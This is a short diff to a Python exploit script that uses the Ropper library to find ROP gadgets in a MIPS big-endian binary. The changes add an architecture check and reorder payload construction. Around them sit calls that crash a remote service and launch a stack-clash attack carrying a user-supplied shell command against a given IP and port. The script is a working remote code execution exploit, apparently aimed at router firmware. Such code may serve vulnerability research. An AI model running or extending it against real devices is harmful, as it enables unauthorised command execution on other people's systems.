@@ -34,7 +34,7 @@ class MyRopper():
 
     def get_gadgets(self, regex):
         gadgets = []
-        for f, g in self.rs.search(search=regex):
+        for _, g in self.rs.search(search=regex):
             gadgets.append(g)
 
         if len(gadgets) > 0:
@@ -46,6 +46,9 @@ class MyRopper():
         s = self.rs.searchString(string)
         t = [a for a in s.values()][0]
         return len(t) > 0
+
+    def get_arch(self):
+        return self.rs.files[0].arch._name
 
     @staticmethod
     def get_ra_offset(gadget):
@@ -227,10 +230,14 @@ if __name__ == "__main__":
         shellCmd = sys.argv[4]
 
         binRop = MyRopper(binary)
-        payload = build_payload(binRop, shellCmd)
+
+        if binRop.get_arch() != 'MIPSBE':
+            raise Exception("Wrong architecture! You have to pass a mipsbe executable")
 
         if binRop.contains_string("pthread_attr_setstacksize"):
             AST_STACKSIZE = ROS_STACKSIZE
+
+        payload = build_payload(binRop, shellCmd)
 
         crash(ip, port) # should make stack clash more reliable
         stackClash(ip, port, payload)
